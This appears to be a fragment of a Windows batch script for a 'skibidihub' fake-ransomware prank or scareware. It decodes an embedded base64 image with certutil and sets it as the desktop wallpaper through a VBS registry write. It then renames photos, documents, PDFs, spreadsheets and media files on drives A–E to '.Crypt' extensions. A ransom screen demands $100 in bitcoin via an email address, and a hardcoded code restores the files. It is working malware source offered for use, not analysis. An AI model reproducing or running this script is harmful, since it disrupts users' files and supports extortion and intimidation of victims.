echo aIYomjont3iCuWIJI6NKHH+stGZrNtVyZWxT3EZKAH1RiirzZEILvO6lJW/iuPYq
echo CxJDMhsDtVRLLNcxhffAimrwwbdKcA6nSjXX75iAERlnITot7zwgZbKycxZFU7HE
echo qQDkqrEUq8TEiAxPpj25Sq6eB7Y0ixMkazsfMz3goMGqcw9rIcjcUslODxUtghG0
echo o8ieU6w+4rsi9KK0RO/KgB4poCj0UvL0p+LEzAHcM73+Cy0QtH6cosmgJKGW7ArF
echo h8HQwkQe7LqOjMCWR0UjAcHWq7vaomm4a8wSjEBr4pUKDkRnBw5eLcyOK0SBVIIy
echo oMdmwcWKlEmlYAOIDI2mrDRpkxMa7AE+dA1+dBPLEHcs1MKW4ie/cBeLh4I0Jgux
echo zD3960E9UguCzE33DI/iFMxKgWKQ/w5Ah8Mo4ExIU83TqkxQJSMfZG0lsmJMFEva
echo FqKEum3Q2hBS2eHZ5FLUvo0mFrUohQI/I00ueNIeLm3RMk3Wto0liFIqPs1tLrXa
echo aC1PxmLW3KLcim1H3A3d1MEo3AArMuILNsIoDnV0HG1WANUfEi8W3o8jOXVQq4XU
echo tk9Vyk42U9Uk8C+g5OGjQlVaxY1SBVVXwyPGXJXR2KFT9CwhP2fJVo3NzDTVvI1c
echo W1O9YA1Ysw3T+pRe6xU4Fo475i4XltIzokXGHBMXem5A/DUTANZeDxZhpSsdn4Mm
echo OQXz5E5F0k81jLVADCBiyydhM1Zjiwpft0NfDfQbOtBP5tJGoP9i7PZjTKhpY1eW
echo ZVvWZV8WZmNWZmeWZmvWZm8WZ3MW4FLkNtGjROzQQfrOQPhVaG2jaG8D7+LjaGWD
echo X20jaUfD6DijaXW2OuqEMchhXqSBWndM2HyB8HbMAQbAYnu2NdCEOKCu06SDv3AB
echo n9jrYUMDbXGjYdHO8dL2FiwlbmWjbXNjbmWD8ZxwM9+Kan22ZsqHeyJAChMBY+fU
echo B2WAbI8xYGsGEIPDhpaWOr5WOA73cY/CYAfkY20BcwVv8OqWNhZWNp42NSxvY5SA
echo PsFzcOMDZhTlO63LWxmgAIsG4X7vYITPIRqBe253Ql4PAvvTdhcw9XwTd83P5tBG
echo A33v+q7/9i4UkFq/5XmZNStST3r/bvPKb/MCMGYIoXi39v76bAKEQUVkBP2I5gC7
echo tx+Zt1osonq/THiV11vC10eoRlzSLXufhneHt2CAz3q94gAZV1CVRmJ2L2QuUHfF
echo ZoBpqnxHj3vd1xJQj2Tid/oWrYEvKt0s+GlK4njndHMohmAC4YFV9nW943pmR98w
echo VGMEEbKI4BC3TBgqiol+KyRqbC8Nc3EDaIbTJ78KSIfbBBJ/SiZJ1G9AkLuM8C+o
echo SacSkTGwRIBOVDwfscAQ8YXlEDwYsj537Fn6pImvmAWtIwGBDH5FJ5EQ6As7IY03
echo U4m1dYCY1G6+mFQyEY5RJYjT1gUnRIEGQela5GRFpVh0J9CzuKsShzCKcTgO27cO
echo YhQ29adMx3YCFQcG26QPUvA5qVBCB2GS+TFLvWWILyMJVqV3ZhDULFZk/084OqJg
echo qrBUC0zZEbKtGxIpEaJSWnhTGFWpHgyyFsCrlHYCIHs5a5HXPkcxHMfTmB71xbSg
echo uYy5Pml5ijFIf2SiMrnxB8OzmOUQiZb5hRwFFmnCZfgAQgmrjk5pFqjZkayzbzn3
echo lkdRm9sKGkfxlzHOtFbxucQTHlHVy4xZG3Sxw2rqk+5ZcAuLosLTnK1gIVvZlUwR
echo GgFaqmRpiErsISVJGRKqAD6rHZ0ZlcXDyuCETaQAKhqw4tJnKf75o/y5lqFZnVW3
echo WCvBGkvqQgWThVehnIxSK3dSMs60TC+MvVjaIMcHp/Yyp9cnK1JSKwPQoOnSdVcz
echo PJF6TQ2FJkehqP/5V2gOlEKlyqRB8gsJCpPeSaUHK6CiApl7EqUc81ewxJmehJlA
echo h6Ur6Km7j5ZvEhOK+idLaiSBCiFZylK7ZTk7+atH9TJCQAZm4AAk4LNA0qQz+jtw
echo SUyAtiZmlHU3BCREmUeZ8q5ms6vJQLjOgLgWIS88M7ug5amMMzLpSqjcSpDDCH7d
echo BoT8+D45WRYikxU1Q7n6klqyUC93eqm3+LOGpBmtcQvGbrZdZjSPRrUfrKzQM7Io
echo kjBd9LcAIqGXurJlTJ415YSMplw5yF+eZbKqgqefSVJ/a0M7EyD0+Ln2ZgUsUrrN
echo KqA/V7zGu6kygAQGoAEgoFW8sxqNE7Gfw57/cjeMcUdFHHeL8eWOrKwNcLhGKexC
echo mY7ACxa7UIx2G1xLM+EG1Q/A4Dq/Ko5zHmHBaZTBzyvAOSlwvnRJz5knFOAVSOVC
echo r7kl9a6zhkAkugwHaUEVNLyqcTtyuHT+QqxFI8xAPSJOU3LA7AvGuwtDojTFchKg
echo FpzLbPTLenQQwNTLivnHqypPL3nIqyuLf3Ew/xXCl0u7N2ByK3zD85s79qTDFC3+
echo 9oAYqmdDmI29WIIhRJUaWpejxq1RHXxX7txS30xWw25ZgTx6O7tQT7XaYE11f1Uj
echo FsLPAddcW1dTu9nbjpImwDVX1XWEkfXP5g5Q4SzG4vVWx4DOdbUhyC2spbHV2nSs
echo 2ipVLq47Mt4BXIv1HWw1VzX1XANjDGFVXv/P0nH1u0U92tAVR9JgElLgRArtVMmc
echo QdbJdEdj2fljbzOv2eUm2pGd2m+jSyd9au8k2wFk2k/u2Y3q26td3CcuZLMcN7od
echo PzrWA9FdUNh93N8d3uNd3ued3uvd3u8d3/Nd3/ed3zPXpzqj5yzXFwRW8/h0FwRe
echo PlJAndJG4TmxqKL2Nhq+3/9Djmpmajv+dnz5BBPyljM+d1eo7mytAvl4geOVY9Ep
echo K6PuaSkDweCnI+ODw004+mRFqzhSfuJFLnShg/HsAhsAnG7eVu6AXhv5ruWBjnTT
echo Y8lnmxfc3UMad3NFY41dm7lvPulab+QxZn7fL3nst3krTYL77yOcFfIcm+0ykPQQ
echo x6e0Pmoi8Ozb7/w2CwOV8us3eH5ffn/fF2wAmP9sL3rTvoLn1/+opfzAXqocC5yP
echo L9TIREZI2HyxQWkyOO9HjwPrF3i/zH2HW6rI3mzM/u7vnn7X3u2kzvO2L+OhxvO5
echo Jn5NT9ggn+ohRA9x8y0IZ3ngh9Gc+MZRBS1e//a1zDT/C/+GrxBURIr2RyxMq5C6
echo Xp+XqkB30rgITxAfGNuKeedP3OGNpziPx8GEpz9/2riKGOgMJ9w8UEJN6PD5z2r6
echo QS1GebxGDz9QadjKpViOdzjGC7/GmfJl0PiO458IZhCTlxsIAMLhAzEEHIxIZSMh
echo OQoPDCgoQSg0MhJLaiZ8hAoWgeJZPIKUwubzKIAIQVcovW6/4/P6Pb/v/wMGCg4S
echo FhoeIgpZbLQ1eCzkSbkNCBmEcVECnGnOLW4xrj1qKkAOeYaW0p0COKauqNkZkEJl
echo lTYwrhrMfalh8rJm2ILW5V6tttrVKqYwHAdzpgI4QwpkWhYgTUE9dA4DpJmmZN62
echo /0kmzx3A1YGvPUtTPFVXhtkVY4uvXQ4jEwsk/Gc6JsocnU3S5L1rA+DVEGXSvNFB
echo aAGew4lPVtBbtW7WpHzY6siKBqyUxYUZ4ZnE5mmaQ3J3qvxLkClOr30DtUEh+KWb
echo hIq48AG4RgSWzpFrICZKqnQp06ZOn0KNaqiBg5gJykTCOcYaOiNcvGiCxaqq1TYw
echo mZD9h7UOVatrw+ZpwLHhLgDVHOr6aPJIEmkp4DSoC5QO3ittY76l5c4ug8Nq2zz4
echo h9btFqB57c4cAiKEHYOYFaHMRivtHIQF1TSgJ6Ta1kp1FZfK2zqo4bRXFdLpsmSN
echo baymoTAcAlSjQbkfffULyP9I6GpKYPpETqBk9mW2c13rlef5C+cjjm8Hzp55m9ih
echo DXvHGx8F5y/vu1ojZL53yG9WdetLza9/P//+/v/zodEeOlmGTkxqsGMKUkdw4dWC
echo xDz4TXlQTDReRRS5I4deCSJxYDskhUaYKCkJeEdLDnyCW24OqvgZbWIwQ0dwMvYC
echo FD9FxfgiF+wdUZw7K9moGmEZlsaVGBFSGCNVlJS4Y2e9SBSijyC2uMw4wVz4BId7
echo NNgcdvVQYOGPKG0nIYVIZXlHme09pKKTdBS1nU+VGalZjTymCaCee/LZp59/1tFX
echo HwTNFp4FJoikSXd8TWhnFI3C2eiaOa0lwxYCaHMAPW//BGWFXgYdmiinSAgZERwG
echo eLqbHshMpISgTz5KYXz0PHAdXHV4htCrm+lV4TtzrGBrHIuOkemmddrxV6ddjcXs
echo HqNqis2rRAj7zaIuTgtqjtHeoatXuiExx6R4bBYrVa9RalY86hwwR7nkRZoku6VS
echo cS0a1077hbC83itvFMd+yeZC13Ex73EUEJAooAsz3LDDDyfp4R0HWKVEfOJWLMSM
echo 4Ujszz/vpSBxPSFLtlrGeESXgDYT/aNaWwRoaNfJK5zMcqomVhVCzFyITFhaM/Fc
echo ctAJqDb0t8jCpLLAfmU8Rs8yS1eJWh948FHS2pBc8jsfq3SxXj5bEXNbCnQwg0pZ
echo qkNaLG9Moq1ZTFMMHbXTWsc9HQVc32G0KXcT/dHGeGS9y9gdVI3y26DhvVB5WzJN
echo N9/0AmcV3FlH3Xjl3xxOn9Z/b50qdZuejPk/Kz/eKwXVQpy66quzznoWbfjaelNU
echo wR6m7Pzhp3p1txOSO++/Ax+88MMTX/wdqDaihfGEyJJ8lcsTgpzs8kGf92DVY5+9
echo 9ttz3z25iD3vPR1JJyb+H75DvLv56JvfvvvvdMMfv/zz01+//ffjn7/++/Pfv///
echo AzCAAhwgAQtowAMiMIEKXCADG+jAB0IwghKcIAUraMELYjCDGtwgBzvowQ+CMIQi
echo HCEJS2jCE6IwhSpcIQtb6MIXwjCGMpwhDWtowxviMIc63CEPe+jDHwIxiEIcIhGL
echo /2jEIyIxiUpcIhOb6MQnQjGKUpwiFatoxStiMYta3CIXu+jFL4IxjGIcIxnLaMYz
echo onGAZyFECiBXwTZ+LRCpiSPD4Bi/NepnjkrRo5/siL/rHcGPUuHjnwiZxv4kTWmO
echo woMF0KMIAaArj5nbUyOng6Q/jCGSfwgPnxpJmUdq0nyMewonk1LKTkKSjnDi0cOo
echo ggBV5kF6DEplHkOJh6KY0paHhMoozTQgVuoJBJUKXx4zgIInlIhP6tsTLu3Xy6Ys
echo 0xDRVF0zGwYCCESAmN1Sz3+mmRWneHOXUOGcxiCVE/bgcQgUkw42UhOyCZzuCSmA
echo 522E8zGFgYabJEtYHBgAE/9tgMCfo1OnZGBpogyQAG6h2Sc+hTDPu60lnVEoaD//
echo SdCWfWSd/ExGCN4Zz4laIRVZ4+Y50aC1i76SFR1NADyx8tB6OvSekYgJPWyU0g6x
echo Mw8jtWdIj/A3hgKOnm8BKkhTFVCLgnSjE6NpRikaU4Cg9CMvfUsTBvoNgSpSolPV
echo klUup9FSHNWqd9gpAGwq1ZiQlD4DCKhmsIqTqiqNCxMIWURP+rp2tIGoZUXrTDEK
echo 0ptuVXQSC6si99rTWzL1rwYVJyImNa6SUoEorjJCEwZwgDKwJmSU4NeoYsaWxdBH
echo HTGrgmGUR1osKE9Q+VpVBkqwgQWcorO29MdmhcQh1SqS4bR3FRQnQZAJbrFFJpeV
echo AD58+y9svIsPuLztZFkhXMwOgGe1xYZsDcrbIn0Jt+Syl11EW5dcedegtLUWdcOr
echo qt566q7GJZV1meAsQSVXnc21C1bYIRcV6VZ5NHGDTMi7Hir8lh75DV98vfSiW7F2
echo AdUZMCvKN14OcUhZ/q2utZTrXmnNlwxaUkNRGExhO1wXw7H/YqxTEpmZZ0IWDTVJ
echo noKvkIaCuYgcLYmQXEQyYzPwhBMqwYVNGvrZBQTUIjce2Ti8MSOBQIIbO05RwIZg
echo gJvSIS8vxhQtxKVUPSx3xR+SMgJgjBAZu8MlEGqDbCyjj0aMCFdXHvJ+P3SU5yEH
echo zMJg8oGV3CYoPBmW9kAyNBi0j2B8Tlrq6FGO2+yXIpcDmGuw8pLVdGXkCIUbPnbU
echo Kux8inTIyhq2hQVGqEuJIUtaD3v+M2xnlVEeWRpDc67HMGTTYxI3xbHm5Asri4Oe
echo vDyHU1HqiWBIGhI8CwkfZZKTI/vQiga84ASMICQgO3JnNn0HK3IK8xwcE0pcc0ZZ
echo 1v5I/3Rm/V948YYy2O6ui4Tc62SMiJNeizYxaVY5Zs+kOMFO665PKY7CYAMjYEuc
echo iGxRm09qQmvsdtFl8FNg86hVEcMoyrbnswd3q8FrXzipHXSlDX1DodkF+hQsFrEA
echo ZcgHId3GAz/CM3CJi6Zf3pk3uv2NhWLDWim9RDGtx6flI3C5WHHG0pjgbDvv9NyX
echo Kj6TNkn+jAPAsydBJ4aNFpOgZG6JH3bOkSFx7uIucypHy0yBt7OsIBXlHFM7//jS
echo h1QKJUP6zIDgulESgvC2l4TpVyI7lfgx2vJQ3Y1tR/sl2d6kjb/Jp406ctNLgSNt
echo XIbmdfD7xjMOqe8IWCxqmyWyFP+XkwE82c1uD+Tj3cF3N5n51MARS57MvpMjFT3m
echo hZC1cmstWTxf4QxU9tZqDDaxYTImCuLibplW+ysfK6MBM4DH5IFbB9q/XVU9Kg+n
echo mmAY200klOGRfTOgj7A4Pvbby2cU7AtAfWxZzPbJAkyqNNUsEf9hE1Rmr2autX7j
echo R+S34T+u2lAlLslb35a6cT76YaV8K81DvtkK6yWc8vFLPv0KNmQfrrgKZ1AFvYyL
echo ceAVgmmGraAcBQYFAnCAQkgY/GFgxnkB//3foQXMAS4NubFfsoRg+Xmb6hFCImFN
echo 6EwMe1DOdLQNrnVZF+gN4vRNHqQMWNiManBOmexgFJQPLYj/whhgRRAa1A7WzTJI
echo TJm8TMygylVQDSzh4BicytSYDdT04DfxFN3cYOzl4AwUIROSXFXATLVVBdl0YRGq
echo QtYUDd/sgsc4jl+NjMjYjOCoYcyUSRUqwBXiTNh0QtsMTdG0DcHtwtUYGhR6yNxc
echo jslUDiAKIjnFYWKNhRUQDoxgYqBohW6sCSNSR2nIoAAICRoe4mJNYSF2zDjch9Yw
echo DhoO4hqezdO4oPawD8MI06QZQi4GkC/yQTg5DDDeDzHe4jGmzmyoDlWgTiIoIwI9
echo I/PoEsPI0v9UIzJi4+00m/1sYwF1IyAIY8MYY/2MYzaa4zmiYzqq4zqyYzu64zvC
echo YzzKF2MOCZIOUU/D1KMc6Z02klQ+ak8KTOM8/9YQPySTIGSNov3JQZoCLYFQ4PAi
echo HoQjJTHkIJzSnrjSYhFZPwSk7CjkI+2jQNoQQV5SH4yK6pRkCunKlf3BPWpPRObH
echo NWVTIJRj8JwkSBZRmgRWUjVU7OSEX7kTS30UTnFETuKUSoraz5lUJCaLUHGgTAEO
echo X4HURxZlKeQkYeHEOgUbVJrVVSHVVGKSjaBIWY2DamClXqzTzZRlX/VgkDRVTo0V
echo U8YBxeGUaljlRX3hV+mUVo7lWUEVHlQDW1WUWMEV3AjAXMFUOt0VMOSVUxpWf40M
echo XOpkYBYWXoKJekgUTqXUT7aUPEFmXUYlRtpkAolkZTiBL62XB/KFY8pXrP+gimUp
echo gAgUV4Bx4obFgWz+AcVwk+JpmC992Dpwl3a9hGxKl38xGHCWicQx2GlKZfzhFaS9
echo 13xxEnCC2IU5J/r5nuZM1yKNmKBERmk9QYh9g212hr1Up6LwQS0sWHopDxtkXH95
echo Bod01iWAix9yV7K4p4DZZnKKZ6Co5tCt5m5U1nBlVn/xS3HOV2hGUJqYGp5BWXBV
echo DpJdQxHAGM4BTFDQS54BQlWJRfYFGpupWTTwmR4UHKLpWJvw2S4ySONZGlKwJCMB
echo Bbd8mdqxwiOMGprhkz3EmIzyQxySKJtMQ0qYaKuhS9URmkgsaKjpAThUWo4VRaAl
echo H6+0RpogKSNJBIv/MtqzOVmDEoZcggqp5ZyyfBkorCid7SiCOtCclGfDxRIFhAG7
echo SRlnCEAIkoYYSJyaAsJEbJoebJy9pdVCCBzM7VvfzEZJEBvAjZyBRVp52Ckf2OF0
echo rBt64NvAsUW6GcOjAtzxKYdCJNfAPQfQxQYbxoQu4VGcLaJcMicSqAPGBZJ6XGB8
echo NQCiIIN8AMWhbhNoPEHDSeGcHqWQzIibxh6cwsGuYaCkmumZjohFjOI9aAORfhad
echo ORkZ7sibXEbj5R1oHpRCcOi6lR3gsAgfaN0c2IgobEdBCsfRfMm4VqsfRKMioh5s
echo aIyMxoXnYZeOjCQAtp3lKVyLRJ07rAC4LmtA/3YJuzreICbWlkzeQmqaXvzNAWAe
echo E4RZiDhU2oQrbGkdrUheurIWtt7csxbAlDXDxGIguRYrA00EQFXoNTRA/llrzORL
echo XujbG/gKntKpK4qByoKGUb5EXRzcqV7DhKImA47YmjLJ9c0GfP2mOW2C+Z0LcpGn
echo zf6eTqlHXyztCJbVFqJDfS4e+THL1F7nqWbL64FbIFktFjhtHryL1DoAukSgAnzE
echo XZUJiq5qk23Hk20gfRgL9pkT7cXs9VUYg5QtuegsvogFDuYe8h1c147sAu1h19Bs
echo p1hh4bCFrlqOEYTdFFBi4Ujc5ZrlEXqH5NqhUqZoncgi02EiHEbZ1GCuyKZwjt6k
echo YrgRwCbiK86h7uYS07oOzhsmYlvoDCuaaucSYju1YdnUYu864oPWYPEqQa6GDT1o
echo bh4mzuBUDSTuI6GA4oSIotc8IX3UBSrKYRM2qpPNbuyC7+PCUsNlr95kodh9bzld
echo IvEmbhbBrfusq5/Er+5spB7MpAjl75/s7/t6ETM+ZPZ8I4AA8PTcL5X2aQpdY+ss
echo sP86sMPMbwK5pJ4mMEpWMMT0P+8Da/AGc3AHe/AHg3AIi/AIk3AJm/AJo3AKq/AK
echo s3ALu/ALw3AMy/AM03AN2/AN43AO6/AO83AP+/APA3EQCzjxEBNxERvxESNxEivx
echo EjNxEzvxE0NxFEvxFFNxFVvxFWNxFmvxFnNxF3vxF4NxGIvxGJNxGZvxGTGjcRqr
echo 8RqzcRu78RvDcRzL8RzTcR3b8R3jcR7r8R7zcR/78R8DciAL8iATciEb8iEjLXIi
echo K/IiM3IjO/IjQ3IkS/IkU3IlW/IlY3Ima/Imc3Ine/Ing3Ioi/Iok3IpmyryKaNy
echo KqvyKrNyK7vyK8NyLMvyLNNyLdvyLeNyLuvyLvNyL/vyLwNzMAsn8zATczEb8zEj
echo czIr8zIzczM78zNDczRL8zRTczVb8zVjczZr8zZzJnM3e/M3g3M4i/M4k3M5m/M5
echo o3M6q/M6s3M7u/M7w3M8y/M803M9ItvzPeNzPuvzPvNzP/vzPwN0QAv0QBN0QRv0
echo QSN0Qiv0QjMjdEM79ENDdERL9ERTdEVb9EVjdEZr9EZzdEd79EeDdEiL9Egik3RJ
echo m/RJo3RKq/RKs3RLu/RLw3RMy/RM03RN2/RN/0kQAAA7
echo -----END CERTIFICATE-----
)>>Image.bin
certutil -decode "Image.bin" "Encrypted.jpeg" >nul 2>nul
echo off>>0.vbs
echo Set shell = WScript.CreateObject ("WScript.Shell")>>0.vbs
echo user = shell.ExpandEnvironmentStrings ("%username%")>>0.vbs
echo Set FSO = CreateObject ("Scripting.FileSystemObject")>>0.vbs
echo Wallpaper = "%cd%\Encrypted.jpeg">>0.vbs
echo shell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", wallpaper>>0.vbs
echo shell.Run "C:\Windows\System32\RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters", 1, True>>0.vbs
timeout /t 3 >nul
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.eky
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.zsc
timeout /t 3 >nul
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.ple
set RANDOM_FILE_NAME=%random%_%random%
echo off>>%RANDOM_FILE_NAME%.bat
echo @echo off>>%RANDOM_FILE_NAME%.bat
echo echo Mensaje = Msgbox("Sus Archivos han Sido Encriptados",48,"Importante")^>^>m.vbs>>%RANDOM_FILE_NAME%.bat
echo call wscript "m.vbs">>%RANDOM_FILE_NAME%.bat
echo goto :eof>>%RANDOM_FILE_NAME%.bat
timeout /t 3 >nul
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.pky
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.vhc
timeout /t 5 >nul
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%>>00000.res
timeout /t 5 >nul
start wscript "0.vbs"
start wscript "0.vbs"
start wscript "0.vbs"
start wscript "0.vbs"
start wscript "0.vbs"
timeout /t 4 >nul
ren *.bmp *.Crypt-1 >nul 2>nul
ren *.jpg *.Crypt-2 >nul 2>nul
ren *.png *.Crypt-3 >nul 2>nul
ren *.docx *.Crypt-4 >nul 2>nul
ren *.pdf *.Crypt-5 >nul 2>nul
ren *.xlsx *.Crypt-6 >nul 2>nul
ren *.mp3 *.Crypt-7 >nul 2>nul
ren *.mp4 *.Crypt-8 >nul 2>nul
ren *.wav *.Crypt-9 >nul 2>nul
cls
@rem --------------------------------------
cls
ren A:\*.bmp *.Crypt-1 >nul 2>nul
ren A:\*.jpg *.Crypt-2 >nul 2>nul
ren A:\*.png *.Crypt-3 >nul 2>nul
ren A:\*.docx *.Crypt-4 >nul 2>nul
ren A:\*.pdf *.Crypt-5 >nul 2>nul
ren A:\*.xlsx *.Crypt-6 >nul 2>nul
ren A:\*.mp3 *.Crypt-7 >nul 2>nul
ren A:\*.mp4 *.Crypt-8 >nul 2>nul
ren A:\*.wav *.Crypt-9 >nul 2>nul
cls
@rem --------------------------------------
cls
ren B:\*.bmp *.Crypt-1 >nul 2>nul
ren B:\*.jpg *.Crypt-2 >nul 2>nul
ren B:\*.png *.Crypt-3 >nul 2>nul
ren B:\*.docx *.Crypt-4 >nul 2>nul
ren B:\*.pdf *.Crypt-5 >nul 2>nul
ren B:\*.xlsx *.Crypt-6 >nul 2>nul
ren B:\*.mp3 *.Crypt-7 >nul 2>nul
ren B:\*.mp4 *.Crypt-8 >nul 2>nul
ren B:\*.wav *.Crypt-9 >nul 2>nul
cls
@rem --------------------------------------
cls
ren C:\*.bmp *.Crypt-1 >nul 2>nul
ren C:\*.jpg *.Crypt-2 >nul 2>nul
ren C:\*.png *.Crypt-3 >nul 2>nul
ren C:\*.docx *.Crypt-4 >nul 2>nul
ren C:\*.pdf *.Crypt-5 >nul 2>nul
ren C:\*.xlsx *.Crypt-6 >nul 2>nul
ren C:\*.mp3 *.Crypt-7 >nul 2>nul
ren C:\*.mp4 *.Crypt-8 >nul 2>nul
ren C:\*.wav *.Crypt-9 >nul 2>nul
cls
@rem --------------------------------------
cls
ren D:\*.bmp *.Crypt-1 >nul 2>nul
ren D:\*.jpg *.Crypt-2 >nul 2>nul
ren D:\*.png *.Crypt-3 >nul 2>nul
ren D:\*.docx *.Crypt-4 >nul 2>nul
ren D:\*.pdf *.Crypt-5 >nul 2>nul
ren D:\*.xlsx *.Crypt-6 >nul 2>nul
ren D:\*.mp3 *.Crypt-7 >nul 2>nul
ren D:\*.mp4 *.Crypt-8 >nul 2>nul
ren D:\*.wav *.Crypt-9 >nul 2>nul
cls
@rem --------------------------------------
cls
ren E:\*.bmp *.Crypt-1 >nul 2>nul
ren E:\*.jpg *.Crypt-2 >nul 2>nul
ren E:\*.png *.Crypt-3 >nul 2>nul
ren E:\*.docx *.Crypt-4 >nul 2>nul
ren E:\*.pdf *.Crypt-5 >nul 2>nul
ren E:\*.xlsx *.Crypt-6 >nul 2>nul
ren E:\*.mp3 *.Crypt-7 >nul 2>nul
ren E:\*.mp4 *.Crypt-8 >nul 2>nul
ren E:\*.wav *.Crypt-9 >nul 2>nul
call "%RANDOM_FILE_NAME%.bat"
goto Crypt

:Crypt
cd "%temp_ubication%" >nul 2>nul
MODE CON: COLS=100 LINES=25
title A2-Decryptor
cls
echo                               Opss... Your Files Have Been Encrypted!
echo ====================================================================================================
echo   Your Files Have Been Encrypted and Are No Longer Accessible, All Your Videos, Photos, Documents
echo                      Among Others They Have Been Encrypted and Are No Longer Accessible
echo ====================================================================================================
echo                                         ¿Can I recover it?
echo ====================================================================================================
echo      Yes you can but you dont have too much time, follow the next steps to recover the files
echo ====================================================================================================
echo.
echo   * Open your browser and then open the mail
echo.
echo   * Send a request of decryption to hackedbyskibidihub@gmail.com
echo.
echo   * Send 100$ bitcoin to the wallet thet we will send you
echo.
echo ====================================================================================================
echo                                   Your ID is: 002-931-183
echo ====================================================================================================
set /p codigo=" Enter the code: "
if /i "%codigo%" == "SKI-BIDI-HUB" (goto Decrypt) else (goto Incorrect)

:Incorrect
msg * Wrong code, try it agin
goto Crypt

:Decrypt
setlocal enabledelayedexpansion >NUL 2>NUL
set s=100
cls
if %s% GEQ 0 (
for /l %%c in (0,1,100) do (
echo.
echo. Decrypting [%%c%% Completado]
timeout /t 1 >nul
cls
)
)
ren *.Crypt-1 *.bmp >nul 2>nul
ren *.Crypt-2 *.jpg >nul 2>nul
ren *.Crypt-3 *.png >nul 2>nul
ren *.Crypt-4 *.docx >nul 2>nul
ren *.Crypt-5 *.pdf >nul 2>nul
ren *.Crypt-6 *.xlsx >nul 2>nul
ren *.Crypt-7 *.mp3 >nul 2>nul
ren *.Crypt-8 *.mp4 >nul 2>nul
ren *.Crypt-9 *.wav >nul 2>nul
cls
@rem --------------------------------------
cls
ren A:\*.Crypt-1 *.bmp >nul 2>nul
ren A:\*.Crypt-2 *.jpg >nul 2>nul
ren A:\*.Crypt-3 *.png >nul 2>nul
ren A:\*.Crypt-4 *.docx >nul 2>nul
ren A:\*.Crypt-5 *.pdf >nul 2>nul
ren A:\*.Crypt-6 *.xlsx >nul 2>nul
ren A:\*.Crypt-7 *.mp3 >nul 2>nul
ren A:\*.Crypt-8 *.mp4 >nul 2>nul
ren A:\*.Crypt-9 *.wav >nul 2>nul
cls
@rem --------------------------------------
cls
ren B:\*.Crypt-1 *.bmp >nul 2>nul
ren B:\*.Crypt-2 *.jpg >nul 2>nul
ren B:\*.Crypt-3 *.png >nul 2>nul
ren B:\*.Crypt-4 *.docx >nul 2>nul
ren B:\*.Crypt-5 *.pdf >nul 2>nul
ren B:\*.Crypt-6 *.xlsx >nul 2>nul
ren B:\*.Crypt-7 *.mp3 >nul 2>nul
ren B:\*.Crypt-8 *.mp4 >nul 2>nul
ren B:\*.Crypt-9 *.wav >nul 2>nul
cls
@rem --------------------------------------
cls
ren C:\*.Crypt-1 *.bmp >nul 2>nul
ren C:\*.Crypt-2 *.jpg >nul 2>nul
ren C:\*.Crypt-3 *.png >nul 2>nul
ren C:\*.Crypt-4 *.docx >nul 2>nul
ren C:\*.Crypt-5 *.pdf >nul 2>nul
ren C:\*.Crypt-6 *.xlsx >nul 2>nul
ren C:\*.Crypt-7 *.mp3 >nul 2>nul
ren C:\*.Crypt-8 *.mp4 >nul 2>nul
ren C:\*.Crypt-9 *.wav >nul 2>nul
cls
@rem --------------------------------------
cls
ren D:\*.Crypt-1 *.bmp >nul 2>nul
ren D:\*.Crypt-2 *.jpg >nul 2>nul
ren D:\*.Crypt-3 *.png >nul 2>nul
ren D:\*.Crypt-4 *.docx >nul 2>nul
ren D:\*.Crypt-5 *.pdf >nul 2>nul
ren D:\*.Crypt-6 *.xlsx >nul 2>nul
ren D:\*.Crypt-7 *.mp3 >nul 2>nul
ren D:\*.Crypt-8 *.mp4 >nul 2>nul
ren D:\*.Crypt-9 *.wav >nul 2>nul
cls
@rem --------------------------------------
cls
ren E:\*.Crypt-1 *.bmp >nul 2>nul
ren E:\*.Crypt-2 *.jpg >nul 2>nul
ren E:\*.Crypt-3 *.png >nul 2>nul
ren E:\*.Crypt-4 *.docx >nul 2>nul
ren E:\*.Crypt-5 *.pdf >nul 2>nul
ren E:\*.Crypt-6 *.xlsx >nul 2>nul
ren E:\*.Crypt-7 *.mp3 >nul 2>nul
ren E:\*.Crypt-8 *.mp4 >nul 2>nul
ren E:\*.Crypt-9 *.wav >nul 2>nul
del /f /q /s "00000.eky" >nul 2>nul
del /f /q /s "00000.pky" >nul 2>nul
del /f /q /s "00000.ple" >nul 2>nul
del /f /q /s "00000.zsc" >nul 2>nul
del /f /q /s "00000.vhc" >nul 2>nul
del /f /q /s "00000.res" >nul 2>nul
del /f /q /s "Image.bin" >nul 2>nul
del /f /q /s "0.vbs" >nul 2>nul
del /f /q /s "README.txt" >nul 2>nul
del /f /q /s "Encrypted.jpeg" >nul 2>nul
del /f /q /s "m.vbs" >nul 2>nul
setlocal disabledelayedexpansion >NUL 2>NUL
cls
echo.
echo. Decrypting [100% Completed]
echo.
echo. Decrypted!
del /f /q /s "Encrypt.sk" >NUL 2>NUL
pause >nul
exit
:shutdownpc
cls 
title shudown skibidihub
echo. [31m
echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
